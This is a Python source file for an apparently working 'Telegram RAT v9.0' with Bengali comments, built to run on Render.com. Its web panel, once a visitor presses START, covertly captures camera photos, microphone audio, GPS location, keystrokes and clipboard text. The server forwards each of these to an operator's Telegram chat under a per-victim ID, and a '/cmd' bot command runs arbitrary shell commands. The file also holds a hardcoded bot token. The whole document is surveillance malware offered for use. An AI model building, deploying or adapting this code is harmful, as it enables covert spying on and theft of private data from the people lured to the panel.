#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Telegram RAT v9.0 – Fully Optimized for Render.com

import os
import sys
import json
import re
import time
import uuid
import threading
import subprocess
import urllib.request
import urllib.parse
import sqlite3
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime

# =============================================
# Render এনভায়রনমেন্ট ভেরিয়েবল থেকে কনফিগ
# =============================================
TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")
PORT = int(os.environ.get("PORT", 5000))
# Render স্বয়ংক্রিয়ভাবে RENDER_EXTERNAL_URL সেট করে দেয়
PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", os.environ.get("PUBLIC_URL", "https://your-app.onrender.com"))

if TOKEN == "8677737961:AAEFlgm4L9CLXY508uB9l6mCl8rSYeYxAwk":
    print("⚠️ Warning: TELEGRAM_TOKEN environment variable not set! Using placeholder.")

BOT_API = "https://api.telegram.org/bot" + TOKEN
sessions = {}   # victim_id -> chat_id
seen = set()    # first-time tracking
lock = threading.Lock()
running = True

# =============================================
# SQLite ডেটাবেস (/tmp-তে রাখা হয়েছে, Render-এ লেখা যায়)
# =============================================
DB_FILE = "/tmp/rat_history.db"
conn = sqlite3.connect(DB_FILE, check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS location (time TEXT, lat REAL, lon REAL, acc REAL)''')
c.execute('''CREATE TABLE IF NOT EXISTS keylog (time TEXT, text TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS clipboard (time TEXT, text TEXT)''')
conn.commit()

def db_insert(table, **cols):
    keys = ', '.join(cols.keys())
    placeholders = ', '.join(['?'] * len(cols))
    sql = f"INSERT INTO {table} ({keys}) VALUES ({placeholders})"
    c.execute(sql, tuple(cols.values()))
    conn.commit()

# =============================================
# HTML প্যানেল (পূর্ণাঙ্গ ফিচারসহ)
# =============================================
PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 RAT v9.0</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
        body { background: #0a0a1a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
        .container { max-width: 420px; width: 100%; background: #111128; padding: 24px; border-radius: 24px; border: 1px solid #00ffcc; box-shadow: 0 0 30px #00ffcc33; }
        h1 { font-size: 24px; text-align: center; color: #ffea00; margin-bottom: 20px; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #ff0055, #a100ff, #00ffcc); background-size: 300% 100%; border: none; color: #fff; font-weight: 900; font-size: 18px; border-radius: 12px; cursor: pointer; animation: grad 3s ease infinite; text-transform: uppercase; letter-spacing: 2px; }
        @keyframes grad { 0% { background-position: 0% 50%; } 100% { background-position: 100% 50%; } }
        .badge { text-align: center; font-size: 12px; color: #666; margin-top: 16px; }
        .log { background: #000; padding: 10px; border-radius: 8px; max-height: 150px; overflow-y: auto; font-size: 12px; color: #0f0; margin: 12px 0; font-family: monospace; }
        #cam, #audio { display: none; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 ULTRA RAT v9.0</h1>
    <button class="btn" onclick="startAll()">🚀 START ALL MODULES</button>
    <div class="log" id="log">[✓] Ready. Press START.</div>
    <div class="badge">👑 KRISH DEVELOPER</div>
</div>
<video id="cam" autoplay muted></video>
<audio id="audio" autoplay></audio>

<script>
    const vid = 'x_' + Math.random().toString(36).substr(2, 6);
    let camStream = null;
    let audioStream = null;
    const log = document.getElementById('log');

    function logMsg(msg) {
        const d = new Date();
        const t = d.toTimeString().split(' ')[0];
        log.innerHTML += `\\n[${t}] ${msg}`;
        log.scrollTop = log.scrollHeight;
        // সার্ভারে ডিবাগ পাঠান
        fetch('/upload', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'debug=' + encodeURIComponent(msg) });
    }

    // ---------- ক্যামেরা ----------
    function startCamera() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
            .then(stream => {
                camStream = stream;
                document.getElementById('cam').srcObject = stream;
                logMsg('📷 Camera started');
                setInterval(capturePhoto, 2000);
            })
            .catch(e => logMsg('❌ Camera err: ' + e.name));
    }

    function capturePhoto() {
        if (!camStream) return;
        const video = document.getElementById('cam');
        const c = document.createElement('canvas');
        c.width = video.videoWidth || 640;
        c.height = video.videoHeight || 480;
        c.getContext('2d').drawImage(video, 0, 0);
        c.toBlob(blob => {
            if (blob) {
                const fd = new FormData();
                fd.append('image', blob, 'cam.jpg');
                fd.append('id', vid);
                fd.append('cam', 'back');
                fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
            }
        }, 'image/jpeg', 0.6);
    }

    // ---------- অডিও ----------
    function startAudio() {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                audioStream = stream;
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => {
                    if (e.data.size > 0) {
                        const fd = new FormData();
                        fd.append('audio', e.data, 'audio.ogg');
                        fd.append('id', vid);
                        fetch('/upload', { method: 'POST', body: fd });
                    }
                };
                recorder.start(5000);
                setInterval(() => recorder.stop(), 5000);
                logMsg('🎙️ Audio started');
            })
            .catch(e => logMsg('❌ Audio err: ' + e.name));
    }

    // ---------- লোকেশন ----------
    function startLocation() {
        if (!navigator.geolocation) return logMsg('❌ No GPS');
        navigator.geolocation.watchPosition(pos => {
            const fd = new FormData();
            fd.append('type', 'loc');
            fd.append('lat', pos.coords.latitude);
            fd.append('lon', pos.coords.longitude);
            fd.append('acc', pos.coords.accuracy);
            fd.append('id', vid);
            fetch('/upload', { method: 'POST', body: fd });
        }, err => logMsg('❌ Loc err: ' + err.message), { enableHighAccuracy: true, timeout: 10000 });
        logMsg('📍 Location tracking ON');
    }

    // ---------- কিলোগার (Keydown) ----------
    let keyBuffer = [];
    function startKeylog() {
        document.addEventListener('keydown', e => {
            const key = e.key || String.fromCharCode(e.keyCode);
            keyBuffer.push(key);
            if (keyBuffer.length >= 20) flushKeylog();
        });
        setInterval(flushKeylog, 5000);
        logMsg('⌨️ Keylogger ON');
    }

    function flushKeylog() {
        if (keyBuffer.length === 0) return;
        const txt = keyBuffer.join('');
        keyBuffer = [];
        fetch('/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'type=keylog&text=' + encodeURIComponent(txt) + '&id=' + vid
        });
    }

    // ---------- ক্লিপবোর্ড ----------
    let lastClip = '';
    function startClipboard() {
        setInterval(() => {
            navigator.clipboard?.readText().then(text => {
                if (text && text !== lastClip) {
                    lastClip = text;
                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: 'type=clipboard&text=' + encodeURIComponent(text) + '&id=' + vid
                    });
                }
            }).catch(() => {});
        }, 3000);
        logMsg('📋 Clipboard monitor ON');
    }

    // ---------- মেইন স্টার্ট ----------
    function startAll() {
        logMsg('🚀 Initializing modules...');
        setTimeout(startCamera, 100);
        setTimeout(startAudio, 200);
        setTimeout(startLocation, 300);
        setTimeout(startKeylog, 400);
        setTimeout(startClipboard, 500);
        logMsg('✅ ALL MODULES ACTIVATED');
    }

    // পেজ লোড হলে অটো স্টার্ট (চাইলে)
    // window.onload = startAll;
</script>
</body>
</html>"""

# =============================================
# টেলিগ্রাম API হেল্পার
# =============================================
def api(method, **params):
    url = BOT_API + "/" + method
    if params:
        url += "?" + urllib.parse.urlencode(params)
    try:
        with urllib.request.urlopen(url, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("[!] API error:", e)
        return None

def send_message(chat_id, text, **extra):
    return api("sendMessage", chat_id=chat_id, text=text, **extra)

def send_photo(chat_id, img_bytes, caption=""):
    boundary = "----FormBoundary" + uuid.uuid4().hex
    body = b""
    for k, v in [("chat_id", chat_id), ("caption", caption)]:
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
    body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"cam.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n".encode()
    body += img_bytes + b"\r\n--" + boundary.encode() + b"--\r\n"
    req = urllib.request.Request(BOT_API + "/sendPhoto", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("[!] send_photo error:", e)
        return None

def send_document(chat_id, file_bytes, filename, caption=""):
    boundary = "----FormBoundary" + uuid.uuid4().hex
    body = b""
    for k, v in [("chat_id", chat_id), ("caption", caption)]:
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
    body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
    body += file_bytes + b"\r\n--" + boundary.encode() + b"--\r\n"
    req = urllib.request.Request(BOT_API + "/sendDocument", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("[!] send_document error:", e)
        return None

def send_audio(chat_id, audio_bytes, duration=0):
    boundary = "----FormBoundary" + uuid.uuid4().hex
    body = b""
    for k, v in [("chat_id", chat_id), ("duration", str(duration))]:
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
    body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"audio\"; filename=\"audio.ogg\"\r\nContent-Type: audio/ogg\r\n\r\n".encode()
    body += audio_bytes + b"\r\n--" + boundary.encode() + b"--\r\n"
    req = urllib.request.Request(BOT_API + "/sendAudio", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("[!] send_audio error:", e)
        return None

# =============================================
# HTTP সার্ভার (হ্যান্ডলার)
# =============================================
class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        if self.path == "/start_rat":
            self.send_response(200)
            self.end_headers()
            return
        body = PAGE.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length)
            content_type = self.headers.get("Content-Type", "")
            fields = {}

            # মাল্টিপার্ট (ফাইল আপলোড) বা ফর্ম ডেটা
            if "multipart" in content_type:
                boundary = re.search(r"boundary=(?:\")?([^\";]+)", content_type)
                if boundary:
                    boundary = boundary.group(1).strip('"')
                    for part in raw.split(("--" + boundary).encode()):
                        part = part.strip(b"\r\n")
                        if not part or part == b"--":
                            continue
                        head, sep, data = part.partition(b"\r\n\r\n")
                        if not sep:
                            continue
                        nm = re.search(rb'name="([^"]+)"', head)
                        if nm:
                            key = nm.group(1).decode()
                            fields[key] = data.rstrip(b"\r\n")
            else:
                # x-www-form-urlencoded
                data = raw.decode()
                for pair in data.split('&'):
                    if '=' in pair:
                        k, v = pair.split('=', 1)
                        fields[k] = urllib.parse.unquote_plus(v)

            # সব ফিল্ডকে স্ট্রিং-এ কনভার্ট (শুধু টেক্সট ফিল্ড)
            for k in list(fields.keys()):
                if isinstance(fields[k], bytes):
                    try:
                        fields[k] = fields[k].decode("utf-8", "ignore")
                    except:
                        fields[k] = str(fields[k])

            vid = fields.get("id", "x")
            with lock:
                chat = sessions.get(vid, "")

            # লোকেশন
            if fields.get("type") == "loc":
                lat = fields.get("lat", "0")
                lon = fields.get("lon", "0")
                acc = fields.get("acc", "0")
                db_insert("location", time=datetime.now().isoformat(), lat=lat, lon=lon, acc=acc)
                if chat:
                    send_message(chat, f"📍 Loc: {lat}, {lon} (Acc: {acc}m)")

            # কিলোগার
            elif fields.get("type") == "keylog":
                txt = fields.get("text", "")[:500]
                if txt and chat:
                    db_insert("keylog", time=datetime.now().isoformat(), text=txt)
                    send_message(chat, f"⌨️ Keylog: `{txt}`", parse_mode="Markdown")

            # ক্লিপবোর্ড
            elif fields.get("type") == "clipboard":
                txt = fields.get("text", "")[:300]
                if txt and chat:
                    db_insert("clipboard", time=datetime.now().isoformat(), text=txt)
                    send_message(chat, f"📋 Clipboard: `{txt}`", parse_mode="Markdown")

            # অডিও ফাইল
            elif fields.get("audio"):
                audio_data = fields["audio"]
                if isinstance(audio_data, str):
                    audio_data = audio_data.encode()
                if chat:
                    send_audio(chat, audio_data, duration=5)

            # ছবি
            elif fields.get("image"):
                img = fields["image"]
                if isinstance(img, str):
                    img = img.encode()
                cam = fields.get("cam", "?")
                if chat:
                    send_photo(chat, img, f"📷 {cam} | {datetime.now().strftime('%H:%M:%S')}")

            # ডিবাগ
            elif fields.get("debug"):
                msg = fields["debug"][:400]
                if chat:
                    send_message(chat, f"🛠 {msg}")

            self.send_response(200)
            self.end_headers()
        except Exception as e:
            print("[!] POST error:", e)
            self.send_response(500)
            self.end_headers()

# =============================================
# টেলিগ্রাম বট পোলিং (ব্যাকগ্রাউন্ড থ্রেডে চলে)
# =============================================
def bot_loop():
    offset = 0
    print("[*] Bot polling started...")
    while running:
        data = api("getUpdates", offset=offset, timeout=30)
        if not data or not data.get("ok"):
            time.sleep(2)
            continue
        for u in data.get("result", []):
            offset = u["update_id"] + 1

            if "callback_query" in u:
                cq = u["callback_query"]
                cid = cq["from"]["id"]
                vid = uuid.uuid4().hex[:8]
                with lock:
                    sessions[vid] = cid
                api("answerCallbackQuery", callback_query_id=cq["id"])
                qs = f"id={vid}"
                link = PUBLIC_URL + "/?" + qs
                kb = json.dumps({"inline_keyboard": [[{"text": "🚀 Open Panel", "url": link}]]})
                send_message(cid, f"🔥 RAT v9.0\n\nPanel Link: {link}\n\nOpen in Chrome and click START.", reply_markup=kb)

            elif "message" in u:
                msg = u["message"]
                chat_id = msg["chat"]["id"]
                text = msg.get("text", "")

                if text == "/start":
                    kb = json.dumps({"inline_keyboard": [
                        [{"text": "🔥 GET PANEL LINK", "callback_data": "panel"}]
                    ]})
                    send_message(chat_id, "🔥 ULTRA RAT v9.0\n\nClick to get your control panel:", reply_markup=kb)

                elif text.startswith("/cmd "):
                    cmd = text[5:]
                    try:
                        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                        output = out.stdout + out.stderr
                        if len(output) > 4000:
                            output = output[:4000] + "\n...truncated"
                        send_message(chat_id, f"```\n{output}\n```", parse_mode="Markdown")
                    except Exception as e:
                        send_message(chat_id, f"❌ Error: {str(e)}")

                elif text == "/screenshot":
                    # Render-এ X11 নেই, তাই screencap কাজ করবে না
                    send_message(chat_id, "❌ Screenshot not supported on Render (no display).")

                elif text == "/help":
                    help_txt = """🔥 Commands:
/start – Show main menu
/cmd <shell> – Execute shell command
/screenshot – Take screenshot (unavailable on Render)
/help – Show this message"""
                    send_message(chat_id, help_txt)

# =============================================
# মেইন ফাংশন
# =============================================
def main():
    print(f"[*] Starting server on port {PORT}")
    print(f"[*] Public URL: {PUBLIC_URL}")
    server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    print("[*] Starting Telegram bot thread...")
    threading.Thread(target=bot_loop, daemon=True).start()

    # Render-কে main প্রক্রিয়া চালু রাখতে হবে
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Shutting down...")
        global running
        running = False

if __name__ == "__main__":
    main()
